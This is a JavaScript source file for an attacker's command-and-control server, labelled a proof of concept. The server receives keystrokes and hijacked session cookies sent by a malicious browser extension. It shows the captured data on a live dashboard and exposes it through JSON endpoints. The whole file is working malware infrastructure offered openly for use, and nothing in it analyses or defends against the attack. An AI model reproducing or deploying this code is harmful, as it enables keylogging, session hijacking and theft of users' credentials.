/*
 * attacker server / C&C (Port 4000)
 * listens for POST requests from the malicious extension:
 * - /log-keys - keylogger payloads (keystrokes).
 * - /log-cookies - hijacked cookies (session exfiltration).
 */

const express = require('express');
const cors = require('cors');

const APP_PORT = 4000;

// in-memory log
const keylog = [];
const cookieLog = [];
const sseClients = new Set(); // connected SSE clients

const app = express();

app.use(cors({ origin: true })); // allow extension and any origin for POC
app.use(express.json());
app.use(express.urlencoded({ extended: true }));


// exfiltration endpoints:

// POST /log-keys - receive keystrokes from content script (keylogger)
  // body: { key?, keys?, url?, target?, timestamp? }
app.post('/log-keys', (req, res) => {
  const payload = {
    ...req.body,
    receivedAt: new Date().toISOString(),
  };
  keylog.push(payload);
  console.log('[KEYLOG]', payload);

  // push update to SSE clients
  const data = JSON.stringify({ type: 'key', payload });
  for (const res of sseClients) {
    res.write(`event: update\n`);
    res.write(`data: ${data}\n\n`);
  }

  res.status(204).end();
});

// POST /log-cookies - receive stolen cookies from background script
  // body: { url?, cookies: [{ name, value, ... }], timestamp? }
app.post('/log-cookies', (req, res) => {
  const payload = {
    ...req.body,
    receivedAt: new Date().toISOString(),
  };
  cookieLog.push(payload);
  console.log('[COOKIES]', payload);

  // push update to SSE clients
  const data = JSON.stringify({ type: 'cookie', payload });
  for (const res of sseClients) {
    res.write(`event: update\n`);
    res.write(`data: ${data}\n\n`);
  }

  res.status(204).end();
});


// dashboard to view captured data:

// GET / - show captured keystrokes and cookies
app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  const keysHtml = keylog.length
    ? keylog.map((e) => `<tr><td>${escapeHtml(e.receivedAt)}</td><td>${escapeHtml(e.url || '-')}</td><td>${escapeHtml(e.target || '-')}</td><td>${escapeHtml(e.key || e.keys || '-')}</td></tr>`).join('')
    : '<tr><td colspan="4">No keystrokes yet.</td></tr>';
  const cookiesHtml = cookieLog.length
    ? cookieLog.map((e) => `<tr><td>${escapeHtml(e.receivedAt)}</td><td>${escapeHtml(e.url || '-')}</td><td><pre>${escapeHtml(JSON.stringify(e.cookies || [], null, 2))}</pre></td></tr>`).join('')
    : '<tr><td colspan="3">No cookies yet.</td></tr>';

  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>C&C — Captured Data</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: system-ui, sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 1.5rem; }
    h1 { color: #e94560; }
    h2 { color: #a2a8d3; margin-top: 2rem; }
    table { width: 100%; border-collapse: collapse; margin-top: 0.5rem; }
    th, td { border: 1px solid #394867; padding: 0.5rem 0.75rem; text-align: left; }
    th { background: #16213e; color: #a2a8d3; }
    pre { margin: 0; font-size: 0.85rem; white-space: pre-wrap; word-break: break-all; }
  </style>
</head>
<body>
  <h1>C&C Server — Captured Data (POC)</h1>
  <p>Data sent by the malicious extension from the victim browser.</p>

  <h2>Keystrokes (live)</h2>
  <table>
    <thead><tr><th>Time</th><th>URL</th><th>Target (id/name)</th><th>Key(s)</th></tr></thead>
    <tbody>${keysHtml}</tbody>
  </table>

  <h2>Stolen Cookies (live)</h2>
  <table>
    <thead><tr><th>Time</th><th>URL</th><th>Cookies</th></tr></thead>
    <tbody>${cookiesHtml}</tbody>
  </table>

  <script>
    // Simple Server-Sent Events client for live updates
    if (!!window.EventSource) {
      const source = new EventSource('/events');
      source.addEventListener('update', (event) => {
        try {
          const msg = JSON.parse(event.data);
          if (msg.type === 'key') {
            // reload page section for simplicity
            location.reload();
          } else if (msg.type === 'cookie') {
            location.reload();
          }
        } catch (e) {
          console.error('SSE parse error', e);
        }
      });
    }
  </script>
</body>
</html>
  `);
});

// GET /events - Server-Sent Events stream for live updates
app.get('/events', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
  });
  res.write('\n');

  sseClients.add(res);

  req.on('close', () => {
    sseClients.delete(res);
  });
});

// GET /api/keys - JSON dump of keylog (for scripting)
app.get('/api/keys', (req, res) => {
  res.json(keylog);
});

// GET /api/cookies - JSON dump of cookie log
app.get('/api/cookies', (req, res) => {
  res.json(cookieLog);
});

function escapeHtml(text) {
  if (text == null) return '';
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
  return String(text).replace(/[&<>"']/g, (m) => map[m]);
}

// start server
app.listen(APP_PORT, () => {
  console.log(`[Attacker Server] C&C running at http://localhost:${APP_PORT}`);
  console.log('[Attacker Server] POST /log-keys - keylogger | POST /log-cookies - cookies');
  console.log('[Attacker Server] GET / - view captured data');
});
